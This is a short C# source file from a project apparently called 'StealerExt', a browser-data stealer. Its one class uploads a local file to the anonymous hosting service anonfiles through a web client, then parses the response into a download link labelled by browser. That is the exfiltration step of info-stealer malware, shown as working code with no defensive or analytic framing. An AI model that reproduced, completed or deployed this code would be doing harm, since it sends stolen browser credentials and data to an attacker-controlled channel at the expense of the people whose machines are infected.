using System.Net;
using System.Text;

namespace StealerExt
{
    internal static class UploadAnonFiles
    {
        public static void UploadFile(string Path, ref string ResponseBody)
        {
            try
            {
                using (var Client = new ExtendedWebClient())
                {
                    Client.Timeout = -1;
                    Client.AllowWriteStreamBuffering = false;
                    byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", Path);
                    Client.Dispose();
                    ResponseBody = Encoding.ASCII.GetString(Response);
                    if (ResponseBody.Contains("\"error\": {"))
                    {
                        ResponseBody = "Error" + ResponseBody.Split('"')[7] + "\r\n";
                    }
                    else
                    {
                        ResponseBody = $"Browser {{0}}: {ResponseBody.Split('\"')[15]}\r\n";
                    }
                }
            }
            catch (WebException ex)
            {
                ResponseBody = $"{{0}} Exception [Anonfiles]: {ex.Message}\r\n";
            }
        }
    }
}
